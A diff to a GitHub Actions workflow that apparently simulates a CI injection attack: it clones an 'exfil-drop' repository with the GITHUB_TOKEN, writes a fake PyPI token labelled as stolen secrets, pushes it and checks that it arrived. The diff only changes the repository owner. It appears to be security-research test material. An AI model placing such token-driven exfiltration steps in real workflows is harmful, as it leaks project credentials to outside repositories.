@@ -14,7 +14,7 @@ jobs:
       - name: "Simulate injection: clone exfil-drop, write secrets, push"
         run: |
           echo "=== Phase 1: Clone exfil-drop ==="
-          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/rafidhaque/exfil-drop.git /tmp/exfil 2>&1
+          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/SISL-UIC/exfil-drop.git /tmp/exfil 2>&1
           echo ""
           echo "=== Phase 2: Write stolen secrets ==="
           echo "pypi_token=fake-pypi-token-12345" > /tmp/exfil/data.txt
@@ -35,7 +35,7 @@ jobs:
       - name: "Verify: re-clone and check"
         run: |
           rm -rf /tmp/check
-          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/rafidhaque/exfil-drop.git /tmp/check 2>/dev/null || true
+          git clone https://x-access-token:${GITHUB_TOKEN}@github.com/SISL-UIC/exfil-drop.git /tmp/check 2>/dev/null || true
           if [ -f /tmp/check/data.txt ]; then
             echo "SUCCESS: data.txt found in exfil-drop"
             echo "=== Contents ==="
